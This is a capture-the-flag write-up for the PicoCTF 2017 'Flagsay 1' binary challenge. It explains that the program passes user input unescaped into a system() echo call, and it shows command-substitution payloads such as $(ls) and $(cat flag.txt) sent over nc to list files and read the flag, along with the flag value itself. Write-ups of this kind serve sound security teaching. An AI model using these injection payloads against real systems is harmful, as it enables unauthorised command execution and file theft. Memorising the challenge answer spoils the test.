# PicoCTF_2017: Flagsay 1

**Category:** Binary
**Points:** 80
**Description:**

>I heard you like flags, so now you can make your own! Exhilarating! Use [flagsay-1](flagsay-1.c)! Source. Connect on shell2017.picoctf.com:51865.

**Hint:**

>System will run exactly what the program gives it

## Write-up
Another simple 1, looking at the source code reveals that whatever is inputted by the user is then `echo` by system.

    char commandBase[] = "/bin/echo \"%s\"\n";

However, input is unescaped, so we can pass on a shell command like

    $ nc shell2017.picoctf.com 51865
    $(ls)
                   _                                        
                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
                 //flagsay-1
    flagsay-1_no_aslr
    flag.txt
    xinetd_wrapper.sh                              /     
                //                                   /      
               //                                   /       
              //                                   /        
             //                                   /         
            //                                   /          
           //___________________________________/           
          //                                                
         //                                                 
        //                                                  
       //                                                   
      //                                                    
     //

Then, we can do something like this

    $ nc shell2017.picoctf.com 51865
    $(cat flag.txt)
                   _                                        
                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
                 //2ab2050bf32e84975a10d774a919e1d0                    /     
                //                                   /      
               //                                   /       
              //                                   /        
             //                                   /         
            //                                   /          
           //___________________________________/           
          //                                                
         //                                                 
        //                                                  
       //                                                   
      //                                                    
     // 

Therefore, the flag is `2ab2050bf32e84975a10d774a919e1d0`.